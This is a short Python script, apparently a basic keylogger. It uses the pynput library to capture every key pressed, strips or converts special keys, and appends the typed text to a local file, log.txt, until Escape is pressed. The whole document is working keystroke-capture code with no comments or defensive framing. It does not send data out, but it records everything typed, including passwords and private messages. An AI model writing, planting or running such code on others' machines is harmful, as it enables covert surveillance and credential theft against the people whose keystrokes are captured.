from pynput.keyboard import Listener


def write_in_file(key) :
    letters = str(key)
    if letters =="Key.esc":
        letters = letters.replace("Key.esc" , " ")
        return False
    letters = letters.replace("'" , "")
    letters = letters.replace("Key.space" , " ")
    if letters == "Key.enter" :
        letters = letters.replace("Key.enter" , "\n")
    letters = letters.replace("Key.shift" , "")
    letters = letters.replace("Key.ctrl_l" , "")
    letters = letters.replace("Key.ctrl_r" , "")
    letters = letters.replace("Key.backspace" , "")


    with open("log.txt" , 'a') as f:
        f.write(letters)

with Listener(on_press=write_in_file) as l:
    l.join()